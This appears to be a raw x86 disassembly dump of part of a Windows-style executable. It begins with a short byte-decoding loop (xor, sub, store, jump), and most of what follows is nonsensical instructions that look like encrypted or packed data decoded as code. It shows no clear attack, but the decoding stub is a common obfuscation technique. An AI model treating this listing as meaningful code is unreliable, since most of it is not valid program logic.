  40387d:	mov    ecx,DWORD PTR [ecx]
  40387f:	push   DWORD PTR [ebp-0x2c]
  403882:	xor    al,0x6f
  403884:	sub    al,0xd
  403886:	mov    BYTE PTR [ecx],al
  403888:	jmp    0x405c4a
  40388d:	lods   eax,DWORD PTR ds:[esi]
  40388e:	mov    bh,0xe6
  403890:	ja     0x403876
  403892:	mov    ds:0xa508636b,eax
  403897:	fdiv   QWORD PTR fs:[esi-0x22ba12c3]
  40389e:	pop    edi
  40389f:	bound  esp,QWORD PTR [edx-0x23]
  4038a2:	pop    edi
  4038a3:	bound  esp,QWORD PTR [edx+0x19]
  4038a6:	int    0x42
  4038a8:	fld    DWORD PTR [ebx+ecx*4+0x32b00023]
  4038af:	sti    
  4038b0:	fs je  0x403919
  4038b3:	je     0x4038c9
  4038b5:	mov    ch,0x79
  4038b7:	stos   BYTE PTR es:[edi],al
  4038b8:	add    bh,BYTE PTR fs:[edi-0x23]
  4038bc:	sub    dl,bh
  4038be:	or     DWORD PTR [eax-0x1b],esp
  4038c1:	daa    
  4038c2:	nop
  4038c3:	sub    DWORD PTR [ecx+0x10fe294a],esi
  4038c9:	xor    BYTE PTR [edi],cl
  4038cb:	and    dl,ah
  4038cd:	or     edi,esp
  4038cf:	mov    al,ds:0x54ba174
  4038d4:	ret    0x9bab
  4038d7:	repz xchg ecx,eax
  4038d9:	mov    eax,DWORD PTR [ebp+esi*1-0x3b00944]
  4038e0:	pop    es
  4038e1:	mov    ah,0x22
  4038e3:	stos   BYTE PTR es:[edi],al
  4038e4:	lea    esp,[eax-0x5d]
  4038e7:	adc    cl,al
  4038e9:	fucomi st,st(2)
  4038eb:	aaa    
  4038ec:	cwde   
  4038ed:	loope  0x4038e1
  4038ef:	loop   0x4038e8
  4038f1:	popf   
  4038f2:	sti    
  4038f3:	mov    edi,0x763cb34b
  4038f8:	pop    ebp
  4038f9:	(bad)  
  4038fa:	mov    eax,ds:0xb29375b3
  4038ff:	sahf   
  403900:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403901:	mov    esi,0xb5a5b532
  403906:	inc    eax
  403907:	push   ds
  403908:	or     eax,0xf0c1dcc8
  40390d:	and    al,0xe
  40390f:	aaa    
  403910:	dec    ecx
  403911:	lock outs dx,BYTE PTR ds:[esi]
  403913:	adc    edx,0x7f
  403916:	loop   0x40391b
  403918:	test   DWORD PTR [ebp-0x19ef677a],ecx
  40391e:	out    dx,eax
  40391f:	ss dec ebx
  403921:	cli    
  403922:	loop   0x403939
  403924:	sbb    al,0xc9
  403926:	sub    eax,0xb1d48ce7
  40392b:	(bad)  
  40392c:	sub    DWORD PTR [ecx+eiz*4],ecx
  40392f:	jp     0x40397b
  403931:	inc    edi
  403932:	and    ebp,DWORD PTR [eax+0x5e]
  403935:	repz int3 
  403937:	imul   DWORD PTR [eax+0x57447c75]
  40393d:	in     eax,dx
  40393e:	inc    esi
  40393f:	and    al,0x57
  403941:	aad    0x73
  403943:	adc    bh,BYTE PTR [ebp+0x69314618]
  403949:	push   ss
  40394a:	repz adc DWORD PTR [ecx-0x5d],ebp
  40394e:	push   ds
  40394f:	mov    al,ds:0xb5f12d3b
  403954:	add    al,ah
  403956:	(bad)  [ebp-0x7b]
  403959:	sbb    BYTE PTR [esi],ch
  40395b:	popa   
  40395c:	test   BYTE PTR [ebp-0x607470cb],ah
  403962:	jl     0x4038ff
  403964:	test   BYTE PTR [edi+eiz*8],ah
  403967:	or     bl,0xf7
  40396a:	sbb    BYTE PTR [edx+0x66e6693a],bl
  403970:	push   cs
  403971:	std    
  403972:	dec    ebp
  403973:	mov    esi,0x707a96df
  403978:	out    dx,al
  403979:	cdq    
  40397a:	sub    BYTE PTR [esi-0x26],cl
  40397d:	jecxz  0x4039e9
  40397f:	test   eax,0x98c176
  403984:	xchg   esp,eax
  403985:	arpl   WORD PTR [eax],bx
  403987:	xor    al,0xe5
  403989:	or     ecx,DWORD PTR [ebp-0x2a97d0c4]
  40398f:	pop    ds
  403990:	imul   eax,esp,0xffffff93
  403993:	int    0xbe
  403995:	enter  0x916a,0xa0
  403999:	outs   dx,DWORD PTR ds:[esi]
  40399a:	fs call 0x5d35164b
  4039a0:	sti    
  4039a1:	inc    BYTE PTR [eax]
  4039a3:	mov    dl,0x3e
  4039a5:	mov    cl,0x3f
  4039a7:	dec    edi
  4039a8:	shr    DWORD PTR [edi+0x2cd81a15],cl
  4039ae:	push   ebx
  4039af:	test   cl,dl
  4039b1:	bound  eax,QWORD PTR [ebp+eiz*1-0x40]
  4039b5:	pop    es
  4039b6:	xchg   esp,eax
  4039b7:	hlt    
  4039b8:	xor    bl,BYTE PTR [ebp-0x63]
  4039bb:	add    edi,esp
  4039bd:	cld    
  4039be:	stos   BYTE PTR es:[edi],al
  4039bf:	(bad)  [edi+0x3bef474b]
  4039c5:	out    dx,eax
  4039c6:	mov    ch,0x19
  4039c8:	xchg   esp,eax
  4039c9:	dec    ebp
  4039ca:	add    al,0x26
  4039cc:	sub    DWORD PTR [edi+ecx*1+0x6d612a0a],ebp
  4039d3:	mov    eax,ds:0xa7f9f2e2
  4039d8:	mov    ebp,0xa9ddea3f
  4039dd:	mov    ecx,0xd154ad5d
  4039e2:	call   FWORD PTR [ecx]
  4039e4:	add    BYTE PTR [edi-0x34ef1500],dl
  4039ea:	jg     0x403a5f
  4039ec:	mov    dh,0x41
  4039ee:	dec    ebx
  4039ef:	add    bl,BYTE PTR [eax]
  4039f1:	pop    edx
  4039f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4039f3:	loop   0x4039cc
  4039f5:	fst    QWORD PTR fs:[ecx+0x71c2b3fd]
  4039fc:	lahf   
  4039fd:	outs   dx,DWORD PTR ds:[esi]
  4039fe:	test   DWORD PTR [edx],edx
  403a00:	and    dl,dh
  403a02:	pop    edx
  403a03:	mov    ds:0x68dd8020,eax
  403a08:	mov    cs,esp
  403a0a:	inc    ecx
  403a0b:	push   ds
  403a0c:	push   edx
  403a0d:	jnp    0x403a21
  403a0f:	aam    0xb1
  403a11:	ret    
  403a12:	shl    esi,cl
  403a14:	idiv   BYTE PTR [edx]
  403a16:	sar    DWORD PTR [esi+0x38],0xd
  403a1a:	jne    0x4039bb
  403a1c:	test   BYTE PTR [edx],0x82
  403a1f:	loopne 0x403a24
  403a21:	sub    al,0x38
  403a23:	adc    al,0xf2
  403a25:	xchg   edi,eax
  403a26:	push   es
  403a27:	ins    BYTE PTR es:[edi],dx
  403a28:	js     0x4039ee
  403a2a:	xchg   ecx,eax
  403a2b:	xor    DWORD PTR [edi+esi*4-0x70],ebp
  403a2f:	and    al,ah
  403a31:	sbb    al,0x63
  403a33:	cmp    ebx,esi
  403a35:	mov    bl,0xc7
  403a37:	lods   al,BYTE PTR ds:[esi]
  403a38:	stos   BYTE PTR es:[edi],al
  403a39:	int    0xee
  403a3b:	out    0x67,eax
  403a3d:	enter  0x594f,0x13
  403a41:	xlat   BYTE PTR ds:[ebx]
  403a42:	test   BYTE PTR [edi+0x54a01db],ch
  403a48:	mov    dh,0x5c
  403a4a:	or     dh,bh
  403a4c:	call   0x72c4:0xf587a8e
  403a53:	ins    BYTE PTR es:[edi],dx
  403a54:	sbb    eax,0xb1793c63
  403a59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403a5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403a5b:	mov    edx,0x850a4b7d
  403a60:	and    DWORD PTR [ebx-0x65],eax
  403a63:	shr    BYTE PTR [ecx+edi*1+0xe9333],cl
  403a6a:	sti    
  403a6b:	and    al,0x46
  403a6d:	push   esi
  403a6f:	add    DWORD PTR [esi+0x71],ebx
  403a72:	loope  0x403a6d
  403a74:	inc    ecx
  403a75:	sub    dh,ah
  403a77:	or     eax,ebp
  403a79:	dec    esp
  403a7a:	mov    ds:0xda9f4147,al
  403a7f:	out    dx,al
  403a80:	push   ebp
  403a81:	lock dec ecx
  403a83:	mov    bh,0x96
  403a85:	std    
  403a86:	aad    0x39
  403a88:	cld    
  403a89:	mov    bh,0x57
  403a8b:	sub    DWORD PTR [esi-0x5db8d3a0],esi
  403a91:	pop    esp
  403a92:	ss xchg ecx,eax
  403a94:	pop    ss
  403a95:	inc    ecx
  403a96:	test   DWORD PTR [edx+0x71],esp
  403a99:	js     0x403a7b
  403a9b:	dec    ecx
  403a9c:	shr    BYTE PTR [edx-0x2b8c1e06],0x43
  403aa3:	std    
  403aa4:	cwde   
  403aa5:	retf   
  403aa6:	mov    al,ds:0x68cb681b
  403aab:	ror    BYTE PTR [edx],1
  403aad:	or     BYTE PTR [ecx+0x2a19007f],al
  403ab3:	es in  eax,dx
  403ab5:	in     al,dx
  403ab6:	rcpps  xmm3,XMMWORD PTR [esi]
  403ab9:	lock mov al,ds:0x1bbf7ad4
  403abf:	mov    ebp,0x86b45a3b
  403ac4:	sub    eax,0x77c7dfd8
  403ac9:	out    dx,al
  403aca:	inc    esi
  403acb:	scas   eax,DWORD PTR es:[edi]
  403acc:	mov    esi,DWORD PTR [ebx+0x78]
  403acf:	ret    0xdade
  403ad2:	push   edx
  403ad3:	loop   0x403a9a
  403ad5:	sbb    al,0x5
  403ad7:	cmp    BYTE PTR [edi],bl
  403ad9:	pop    esp
  403ada:	js     0x403b2a
  403adc:	mov    al,ds:0xea1ee81
  403ae1:	jns    0x403ac9
  403ae3:	or     esp,eax
  403ae5:	int    0x35
  403ae7:	call   0x9729:0xd35a529c
  403aee:	clc    
  403aef:	outs   dx,BYTE PTR ds:[esi]
  403af0:	adc    ecx,esi
  403af2:	inc    ebx
  403af3:	adc    BYTE PTR [ebx+esi*2],ch
  403af6:	mov    ah,0x72
  403af8:	lock or DWORD PTR [eax+0x14f4d7b8],edx
  403aff:	sub    BYTE PTR [ecx-0x56],dh
  403b02:	and    cl,BYTE PTR ds:0x9b703f83
  403b08:	and    bl,BYTE PTR [esi-0x10b804b]
  403b0e:	or     BYTE PTR [esi],0xde
  403b11:	lds    edx,FWORD PTR [edx-0x6e1a7474]
  403b17:	cmp    eax,DWORD PTR [esi-0x5f]
  403b1a:	mov    DWORD PTR [esp+esi*1-0x10dc02e8],esi
  403b21:	stos   BYTE PTR es:[edi],al
  403b22:	add    eax,0xf1c2b440
  403b27:	ins    DWORD PTR es:[edi],dx
  403b28:	xchg   esp,eax
  403b29:	ds push edi
  403b2b:	cwde   
  403b2c:	cmp    eax,0xc695de23
  403b31:	pop    ds
  403b32:	test   al,0xd7
  403b34:	pop    esp
  403b35:	jmp    0x403b51
  403b37:	push   es
  403b38:	xchg   esp,eax
  403b39:	or     al,BYTE PTR [ebx]
  403b3b:	stc    
  403b3c:	loope  0x403b7a
  403b3e:	pop    esi
  403b3f:	sub    DWORD PTR [edx+0x66],0x1c
  403b43:	pop    esi
  403b44:	es pop edx
  403b46:	into   
  403b47:	dec    edx
  403b48:	sar    DWORD PTR [edi-0x76],1
  403b4b:	mov    esi,0x302c3ad9
  403b50:	dec    edx
  403b51:	xchg   DWORD PTR [esi-0x2584d18f],esi
  403b57:	inc    ebp
  403b58:	mov    esp,0x6f093df8
  403b5d:	push   ebp
  403b5e:	or     BYTE PTR [ecx],bl
  403b60:	mov    ds:0x3275b44a,eax
  403b65:	(bad)  
  403b66:	dec    eax
  403b67:	sti    
  403b68:	call   0x9597c4b0
  403b6d:	ficomp DWORD PTR [ebx+0x14]
  403b70:	inc    ebp
  403b71:	fistp  WORD PTR [esi-0x12]
  403b74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b75:	pop    es
  403b76:	push   es
  403b77:	jmp    0x403b3b
  403b79:	das    
  403b7a:	mov    eax,ds:0x3ab6c9aa
  403b7f:	int3   
  403b80:	data16 and bl,BYTE PTR [eax]
  403b83:	and    al,0x6e
  403b85:	sub    BYTE PTR ds:0x96f6aaea,dl
  403b8b:	jle    0x403b4f
  403b8d:	loope  0x403b4a
  403b8f:	add    BYTE PTR [edx],dl
  403b91:	arpl   WORD PTR [ebx+ecx*1+0x75decffc],cx
  403b98:	jg     0x403c12
  403b9a:	nop
  403b9b:	jns    0x403bee
  403b9d:	std    
  403b9e:	pop    edi
  403b9f:	cmp    BYTE PTR [edi],0xdf
  403ba2:	mov    DWORD PTR [edx+0x640b60cc],esi
  403ba8:	outs   dx,DWORD PTR ds:[esi]
  403ba9:	push   es
  403baa:	and    BYTE PTR [ebx],dh
  403bac:	mov    bh,ah
  403bae:	or     al,0xd1
  403bb0:	inc    eax
  403bb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403bb2:	push   esp
  403bb3:	cld    
  403bb4:	dec    ebp
  403bb5:	mov    bl,0x27
  403bb7:	adc    al,0xd2
  403bb9:	pop    ecx
  403bba:	dec    esi
  403bbb:	inc    ecx
  403bbc:	arpl   WORD PTR [ebx+0xc],ax
  403bbf:	mov    ds:0x3a4c3f73,al
  403bc4:	fidivr WORD PTR [ebx]
  403bc6:	cmp    eax,0x4d7c6d43
  403bcb:	push   es
  403bcc:	mov    ah,0xa8
  403bce:	cmc    
  403bcf:	or     ebx,DWORD PTR [edx-0x3c]
  403bd2:	jnp    0x403c0b
  403bd4:	xor    al,0x37
  403bd6:	jl     0x403b99
  403bd8:	stc    
  403bd9:	pop    ds
  403bda:	shl    BYTE PTR [edi],cl
  403bdc:	sub    esi,DWORD PTR [edi+0x77ad0113]
  403be2:	jo     0x403c39
  403be4:	inc    ebp
  403be5:	and    edi,DWORD PTR [ebx+eax*1-0x4e59b706]
  403bec:	shl    BYTE PTR ds:0xb251a495,cl
  403bf2:	mov    ebx,0x266bb6b1
  403bf7:	and    ch,BYTE PTR [esi-0x74fc48ae]
  403bfd:	sub    cl,BYTE PTR [ecx+0x1f6ce9f1]
  403c03:	out    0xe6,eax
  403c05:	test   eax,0x26d41355
  403c0a:	xchg   esi,eax
  403c0b:	cmp    BYTE PTR [esi+0x22],bl
  403c0e:	fisubr WORD PTR [ecx+0x74]
  403c11:	pop    es
  403c12:	repnz inc esi
  403c14:	fcmovnu st,st(5)
  403c16:	(bad)  
  403c17:	ins    BYTE PTR es:[edi],dx
  403c18:	shl    edx,1
  403c1a:	in     al,0x28
  403c1c:	adc    DWORD PTR [ebx+0x14b1f23a],edx
  403c22:	fcom   st(5)
  403c24:	pop    ss
  403c25:	icebp  
  403c26:	mov    ch,0x33
  403c28:	push   ebp
  403c29:	jae    0x403c70
  403c2b:	(bad)  
  403c2c:	fisub  DWORD PTR [edi+0x36074e56]
  403c32:	fs adc cl,cl
  403c35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c36:	ja     0x403bba
  403c38:	out    dx,al
  403c39:	pop    ecx
  403c3a:	jb     0x403c9b
  403c3c:	retf   0x378
  403c3f:	repz push ecx
  403c41:	fistp  QWORD PTR ds:0x63202d70
  403c47:	fidiv  WORD PTR [eax]
  403c49:	sub    ecx,DWORD PTR [eiz*8-0x3cb00d8]
  403c50:	dec    eax
  403c51:	mov    bl,0x84
  403c53:	adc    DWORD PTR [edx+eax*2-0x27bc5dfa],edi
  403c5a:	or     edi,ebx
  403c5c:	lods   al,BYTE PTR ds:[esi]
  403c5d:	mov    dl,0xe5
  403c5f:	push   0xffffff8d
  403c61:	jmp    0x99c:0xfa5355c8
  403c68:	or     BYTE PTR [ecx-0x3aa6ed80],dh
  403c6e:	cmp    esp,DWORD PTR [edx]
  403c70:	les    edx,FWORD PTR [edi+0x54965c65]
  403c76:	aas    
  403c77:	js     0x403c46
  403c79:	pop    esp
  403c7a:	leave  
  403c7b:	rcl    DWORD PTR [ebp-0x5341b95b],1
  403c81:	jmp    0x8573dd02
  403c86:	(bad)  
  403c88:	aam    0xa9
  403c8a:	fcomp  QWORD PTR [ebx-0x3c]
  403c8d:	sti    
  403c8e:	push   ebp
  403c8f:	jp     0x403c48
  403c91:	sub    bl,bl
  403c93:	sub    eax,0xb5c1a6db
  403c98:	lods   al,BYTE PTR ds:[esi]
  403c99:	adc    eax,0x8a8e50b5
  403c9e:	test   al,0xb3
  403ca0:	add    esp,DWORD PTR [ebp-0x6d8422cf]
  403ca6:	mov    ah,0xc8
  403ca8:	and    ebp,edx
  403caa:	enter  0xd1b1,0xa1
  403cae:	adc    bh,cl
  403cb0:	add    esi,DWORD PTR [ebx+0x7a46dd74]
  403cb6:	or     al,0xb7
  403cb8:	xlat   BYTE PTR ds:[ebx]
  403cb9:	jo     0x403cee
  403cbb:	test   esi,0xeb897ca
  403cc1:	or     BYTE PTR [edi+eiz*4+0x45379170],bl
  403cc8:	test   DWORD PTR [edi],edx
  403cca:	or     al,0xe
  403ccc:	ret    0xc78e
  403ccf:	jp     0x403d4d
  403cd1:	mov    dh,0x11
  403cd3:	fist   WORD PTR [eax-0x6a628efe]
  403cd9:	lea    ebp,[ecx-0x7c]
  403cdc:	and    bl,BYTE PTR [eax]
  403cde:	das    
  403cdf:	rcl    BYTE PTR [ebx-0x2f],1
  403ce2:	jecxz  0x403c7f
  403ce4:	pop    ebx
  403ce5:	(bad)  
  403ce6:	stc    
  403ce7:	cmp    eax,esi
  403ce9:	inc    edx
  403cea:	xchg   ecx,eax
  403ceb:	mov    eax,ds:0xaa8ac533
  403cf0:	mov    cl,BYTE PTR [edi-0x7b]
  403cf3:	addr16 int3 
  403cf5:	out    0xc9,eax
  403cf7:	sub    ebx,eax
  403cf9:	and    al,BYTE PTR [edx+0x70]
  403cfc:	in     eax,dx
  403cfd:	push   cs
  403cfe:	retf   0x2e0c
  403d01:	mov    dh,0xb7
  403d03:	in     eax,dx
  403d04:	add    ebp,DWORD PTR [edi]
  403d06:	loopne 0x403d39
  403d08:	ins    BYTE PTR es:[edi],dx
  403d09:	inc    ebx
  403d0a:	fcmove st,st(0)
  403d0c:	call   0xa544:0xe27d5419
  403d13:	xchg   edx,eax
  403d14:	add    BYTE PTR [ebx+eiz*4],dh
  403d17:	lods   al,BYTE PTR ds:[esi]
  403d18:	add    DWORD PTR [ebp-0x4c],ecx
  403d1b:	fwait
  403d1c:	es loope 0x403d42
  403d1f:	sbb    edi,DWORD PTR [edx-0x6a]
  403d22:	inc    edx
  403d23:	std    
  403d24:	repz inc ecx
  403d26:	add    BYTE PTR [esi-0x3d],al
  403d29:	popa   
  403d2a:	push   0xffffffb4
  403d2c:	mov    ds:0xc3bc578e,eax
  403d31:	or     BYTE PTR [edi+0x49],dh
  403d34:	popf   
  403d35:	sahf   
  403d36:	fdiv   QWORD PTR [edi-0x74ca72db]
  403d3c:	lds    edx,FWORD PTR [edi+0x1f]
  403d3f:	push   esp
  403d40:	cdq    
  403d41:	dec    ebx
  403d42:	ret    
  403d43:	repz in eax,0x4a
  403d46:	repz (bad) 
  403d48:	je     0x403d39
  403d4a:	cmp    edx,DWORD PTR [edi-0x39002265]
  403d50:	ret    0x1b8
  403d53:	ss jns 0x403d8b
  403d56:	cmp    DWORD PTR [ebx+0xd],eax
  403d59:	xchg   esi,eax
  403d5a:	popf   
  403d5b:	mov    ebp,0x4ab17ec
  403d60:	sbb    BYTE PTR [ebx+edi*2+0x75],ah
  403d64:	push   esi
  403d65:	dec    ebp
  403d66:	scas   al,BYTE PTR es:[edi]
  403d67:	pop    ebx
  403d68:	or     eax,0x98d2719d
  403d6d:	ins    DWORD PTR es:[edi],dx
  403d6e:	out    dx,eax
  403d6f:	push   es
  403d70:	mov    al,0x59
  403d72:	pop    edi
  403d73:	push   edi
  403d74:	sbb    DWORD PTR [ebp-0x3d2a49e4],ebx
  403d7a:	shl    DWORD PTR [eax+ecx*2-0x6d],0x18
  403d7f:	sbb    bl,BYTE PTR [ebx+ebx*4]
  403d82:	inc    ebp
  403d83:	push   0x47
  403d85:	fwait
  403d86:	sbb    bh,BYTE PTR [edi]
  403d88:	dec    ebp
  403d89:	xchg   edx,eax
  403d8a:	int3   
  403d8b:	jno    0x403dc4
  403d8d:	jle    0x403dcc
  403d8f:	mov    ds:0xcbbecead,eax
  403d94:	or     BYTE PTR cs:[ebx],cl
  403d97:	cmp    BYTE PTR ds:0x3f3526e0,ah
  403d9d:	in     eax,0xb
  403d9f:	mov    edi,0x486f2978
  403da4:	(bad)  
  403da5:	adc    al,0x7e
  403da7:	stc    
  403da8:	shl    BYTE PTR [esi+ecx*1+0x41],cl
  403dac:	sub    DWORD PTR [ebx],0xffffffeb
  403daf:	dec    edx
  403db0:	xchg   DWORD PTR [ebx],edx
  403db2:	dec    ebx
  403db3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403db4:	xor    DWORD PTR [ebx-0x4d],ecx
  403db7:	cdq    
  403db8:	mov    WORD PTR [edi],cs
  403dba:	sub    ecx,DWORD PTR [esi]
  403dbc:	push   ebx
  403dbd:	sbb    ebp,ebx
  403dbf:	test   edx,0xfcd784e4
  403dc5:	pop    es
  403dc6:	lds    ebp,FWORD PTR [esi+0x6af51d7b]
  403dcc:	xchg   edx,eax
  403dcd:	jge    0x403db2
  403dcf:	addr16 sub eax,0xb87b050c
  403dd5:	mov    gs,WORD PTR [ecx+0x6958b032]
  403ddb:	shr    dh,cl
  403ddd:	pop    esp
  403dde:	(bad)  
  403ddf:	aaa    
  403de0:	mov    dl,0xa4
  403de2:	cdq    
  403de3:	jg     0x403e48
  403de5:	test   eax,0xdbe4ad4a
  403dea:	scas   eax,DWORD PTR es:[edi]
  403deb:	adc    bl,BYTE PTR [edi+0xea8fe49]
  403df1:	sbb    dh,BYTE PTR [ebx-0x7cd53d3a]
  403df7:	xor    al,BYTE PTR es:[edi-0x1f]
  403dfb:	xor    eax,eax
  403dfd:	inc    esp
  403dfe:	mov    dl,0x93
  403e00:	and    al,0xd7
  403e02:	or     eax,0xe84f5fb9
  403e07:	cmp    cl,BYTE PTR ds:[edx-0x581828d5]
  403e0e:	inc    edx
  403e0f:	aad    0x2d
  403e11:	inc    esp
  403e12:	dec    esp
  403e13:	sbb    eax,DWORD PTR [edi]
  403e15:	sti    
  403e16:	push   DWORD PTR [eax]
  403e18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e19:	and    al,0x63
  403e1b:	mov    BYTE PTR [esi+0x24],0xed
  403e1f:	rol    DWORD PTR [ebp+0x77],1
  403e22:	push   0x62f94523
  403e27:	push   ebp
  403e28:	ror    DWORD PTR [ebp-0x8],1
  403e2b:	adc    DWORD PTR [edx-0x68f87154],ebp
  403e31:	cmp    eax,0xb1c0accd
  403e36:	mov    esp,0x28b149d2
  403e3b:	cld    
  403e3c:	mov    esp,0x7af94700
  403e41:	imul   BYTE PTR [ecx+0x37]
  403e44:	cld    
  403e45:	mov    DWORD PTR [ebx+0x49869096],edi
  403e4b:	sbb    al,0x1c
  403e4d:	and    eax,0x21345cb4
  403e52:	shl    DWORD PTR ds:0x8a753f16,1
  403e58:	mov    ebp,0x5aa99c7
  403e5d:	jecxz  0x403ec9
  403e5f:	pushf  
  403e60:	or     bl,BYTE PTR [esi-0x24]
  403e63:	cmp    al,0x5a
  403e65:	add    BYTE PTR ds:0x271e0cde,ah
  403e6b:	add    bl,cl
  403e6d:	mov    ecx,DWORD PTR [esi]
  403e6f:	mov    ebp,0xaaaff771
  403e74:	test   DWORD PTR [ecx+ebx*2-0x4b],esi
  403e78:	call   0xf132:0xd8ea5e4a
  403e7f:	mov    dh,BYTE PTR [edx+0x4c]
  403e82:	(bad)  
  403e83:	div    DWORD PTR [esi]
  403e85:	sbb    DWORD PTR [ebp-0x53dbc225],edi
  403e8b:	les    eax,FWORD PTR [ebx+0xe463311]
  403e91:	mov    edi,0x10ec2f1b
  403e96:	push   edx
  403e97:	fistp  DWORD PTR [ecx-0x18effcf]
  403e9d:	add    BYTE PTR [ebp+0x11],al
  403ea0:	xor    eax,0xdf7d59b3
  403ea5:	cwde   
  403ea6:	dec    esp
  403ea7:	mov    eax,ds:0xc16860ca
  403eac:	enter  0x28,0x92
  403eb0:	cmp    DWORD PTR [ecx],ecx
  403eb2:	(bad)  
  403eb3:	mov    bl,0x7c
  403eb5:	jge    0x403e86
  403eb7:	adc    bl,BYTE PTR [ebp-0xe31554b]
  403ebd:	cli    
  403ebe:	in     al,dx
  403ebf:	lods   eax,DWORD PTR ds:[esi]
  403ec0:	mov    ecx,0x98d55f3d
  403ec5:	jecxz  0x403ebf
  403ec7:	push   ebx
  403ec8:	arpl   cx,di
  403eca:	repz adc ah,BYTE PTR [edx+0x30decfab]
  403ed1:	adc    al,0x57
  403ed3:	lock sbb eax,0x153321d8
  403ed9:	lds    edi,FWORD PTR [eax+0x498fef06]
  403edf:	sub    ah,ch
  403ee1:	jns    0x403f30
  403ee3:	mov    edx,DWORD PTR [ebp-0x3]
  403ee6:	sub    dh,BYTE PTR [ebx-0x6e45a3cb]
  403eec:	jbe    0x403f4f
  403eee:	xor    ch,al
  403ef0:	imul   esi,DWORD PTR [edx+0x25],0x55d2536a
  403ef7:	sub    eax,0xa02e4377
  403efc:	pusha  
  403efd:	arpl   WORD PTR [edi],di
  403eff:	push   es
  403f00:	outs   dx,DWORD PTR ds:[esi]
  403f01:	(bad)  
  403f03:	fnstsw WORD PTR [esi-0x6090773a]
  403f09:	inc    edi
  403f0a:	mov    DWORD PTR [edi+0x6f],ebp
  403f0d:	mov    dh,BYTE PTR [esi+ebp*2+0x2a73326a]
  403f14:	dec    ebx
  403f15:	xchg   ebx,eax
  403f16:	jmp    0x5240:0x60e9af5a
  403f1d:	sub    dh,BYTE PTR [edi+0x9c9b2b3]
  403f23:	pusha  
  403f24:	mov    DWORD PTR [eax+0x654885ec],ecx
  403f2a:	or     eax,DWORD PTR [eax-0x8]
  403f2d:	popf   
  403f2e:	out    dx,al
  403f2f:	or     ah,al
  403f31:	(bad)  
  403f32:	xor    BYTE PTR [edi],al
  403f34:	frstor [ebp+0x3b]
  403f37:	pusha  
  403f38:	xor    DWORD PTR [edx],eax
  403f3a:	pop    DWORD PTR [ebx]
  403f3c:	jnp    0x403f08
  403f3e:	ret    
  403f3f:	mov    esp,0x710dd4a0
  403f44:	sub    DWORD PTR [edi+0x39],ebp
  403f47:	(bad)  
  403f48:	mov    ecx,ebp
  403f4a:	jge    0x403fb8
  403f4c:	in     al,dx
  403f4d:	(bad)  
  403f4e:	lea    ebp,[ebp-0x4b45d01]
  403f54:	mov    ebx,0x46ac5c76
  403f59:	cmp    DWORD PTR [esi],0xfffffffd
  403f5c:	mov    ch,0xc5
  403f5e:	out    0x20,eax
  403f60:	jo     0x403fd0
  403f62:	xchg   edx,eax
  403f63:	imul   esi,ecx,0x410c5b7f
  403f69:	mov    ds:0xeeba8161,al
  403f6e:	cmp    al,0x66
  403f70:	add    BYTE PTR [esi],ah
  403f72:	stc    
  403f73:	xor    al,0x9a
  403f75:	pop    ds
  403f76:	out    0x3d,eax
  403f78:	mov    WORD PTR [eax-0x1a0420e3],es
  403f7e:	jb     0x403f07
  403f80:	mov    gs,WORD PTR [edi]
  403f82:	and    ebx,eax
  403f84:	das    
  403f85:	in     al,dx
  403f86:	inc    ebx
  403f87:	imul   BYTE PTR [edx]
  403f89:	jae    0x403fba
  403f8b:	add    DWORD PTR [eax+0x2205146a],esp
  403f91:	xor    BYTE PTR ds:[ebx+0x5a],ch
  403f95:	out    0x2d,al
  403f97:	push   0xfffffffa
  403f99:	clc    
  403f9a:	jecxz  0x40400a
  403f9c:	xchg   ecx,eax
  403f9d:	leave  
  403f9e:	int3   
  403f9f:	(bad)  
  403fa0:	jmp    0xe02e:0x23d682b1
  403fa7:	jmp    0x65fe45e8
  403fac:	cld    
  403fad:	cwde   
  403fae:	mov    al,0x1d
  403fb0:	ja     0x403fb9
  403fb2:	or     eax,0x103e0fc2
  403fb7:	dec    esi
  403fb8:	(bad)  [ebp+0x39e44dc7]
  403fbe:	loope  0x403fac
  403fc0:	mov    dl,0xa1
  403fc2:	shl    ebp,0xd6
  403fc5:	(bad)  
  403fc6:	xor    eax,0xa8dfc3b9
  403fcb:	popf   
  403fcc:	sbb    DWORD PTR [ecx+ecx*4+0x7f],ebx
  403fd0:	fcomp  st(6)
  403fd2:	adc    ebp,DWORD PTR [ecx]
  403fd4:	xacquire xchg BYTE PTR [ebx-0x7],bh
  403fd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403fda:	ud1    eax,DWORD PTR [edx+edx*4+0x51594494]
  403fe2:	inc    esi
  403fe3:	stos   DWORD PTR es:[edi],eax
  403fe4:	pushf  
  403fe5:	pushf  
  403fe6:	out    dx,al
  403fe7:	cmp    BYTE PTR ds:0x3d028cd8,0xef
  403fee:	pop    edi
  403fef:	mov    dl,bh
  403ff1:	inc    esp
  403ff2:	fist   WORD PTR [esi+ecx*8]
  403ff5:	adc    BYTE PTR [ecx+0x53],dl
  403ff8:	mov    ecx,0xc6ae6f88
  403ffd:	pop    esp
  403ffe:	inc    edi
  403fff:	(bad)  
  404000:	sub    al,0x7a
  404002:	test   eax,0xa111985e
  404007:	sti    
  404008:	inc    edx
  404009:	xchg   edx,eax
  40400a:	cld    
  40400b:	or     eax,0x5dd2078d
  404010:	mov    BYTE PTR [esi],dl
  404012:	push   ss
  404013:	sbb    dh,0x41
  404016:	mov    esi,0xa539101b
  40401b:	retf   0x8b3b
  40401e:	aam    0xd1
  404020:	fwait
  404021:	sbb    BYTE PTR [eax-0x41],ah
  404024:	sub    cl,BYTE PTR [ebx-0x4245a6ec]
  40402a:	sbb    al,0x4a
  40402c:	lods   al,BYTE PTR ds:[esi]
  40402d:	sub    bh,0x67
  404030:	lds    esi,FWORD PTR [edx]
  404032:	and    dh,bh
  404034:	pop    esp
  404035:	out    dx,eax
  404036:	in     al,dx
  404037:	sbb    ebp,DWORD PTR [ebx-0x6]
  40403a:	ins    DWORD PTR es:[edi],dx
